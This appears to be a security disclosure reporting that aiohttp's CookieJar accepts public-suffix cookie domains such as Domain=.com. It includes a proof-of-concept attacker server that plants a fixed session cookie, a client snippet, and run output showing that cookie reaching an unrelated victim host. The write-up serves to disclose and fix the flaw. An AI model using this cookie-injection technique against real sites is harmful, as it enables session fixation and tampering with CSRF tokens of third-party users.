**Verification: DYNAMICALLY-REPRODUCED** (PoC executed in WSL2; output from real run)

## Description

`CookieJar._is_domain_match` (`aiohttp/cookiejar.py`) performs plain suffix matching on the `Domain` attribute with no public-suffix list (PSL) check. A server response of `Set-Cookie: sid=evil; Domain=.com` is accepted into the shared jar and replayed to every `*.com` host afterwards:

```python
async with aiohttp.ClientSession() as s:          # shared default CookieJar
    async with s.get("http://attacker.com:8092/") as r:   # plants Domain=.com cookie
        ...
    async with s.get("http://victim.com:8093/") as r:     # unrelated host
        ...
```

Browsers (and PSL-aware cookie jars) reject domain attributes that are public suffixes; aiohttp's jar has no such protection.

## Impact

A site the client visits first can inject cookies into unrelated third-party domains for the lifetime of the session: session-fixation against apps that accept a client-supplied session id cookie, pollution of CSRF tokens / feature flags / anything keyed on cookie values, for any victim domain sharing the suffix. Requires only that the client visit the attacker's site before (or at any time alongside) the victim site with the same `ClientSession` — the normal crawler/aggregator/proxy usage.

## PoC

Verified on current master snapshot. Two local aiohttp servers stand in for the two unrelated real domains (`attacker.com` / `victim.com` via /etc/hosts → 127.0.0.1):

```python
async def attacker(request):
    resp = web.Response(text="hello from attacker")
    resp.headers.add("Set-Cookie", "sid=attacker-fixed-session; Domain=.com; Path=/")
    return resp

async def victim(request):
    return web.json_response({"cookie_received": request.headers.get("Cookie", "")})
```

## Execution result

```
[attacker.com] planted: sid=attacker-fixed-session; Domain=.com; Path=/
[victim.com]   received Cookie header: 'sid=attacker-fixed-session'
[evidence] cookie planted by attacker.com sent to unrelated victim.com: True
[RESULT] {"poc": "aiohttp-05-cookiejar-public-suffix",
          "cross_domain_cookie_injected": true, "verdict": "REPRODUCED"}
```

The victim server's request shows the attacker-planted cookie arriving from the completely unrelated host.
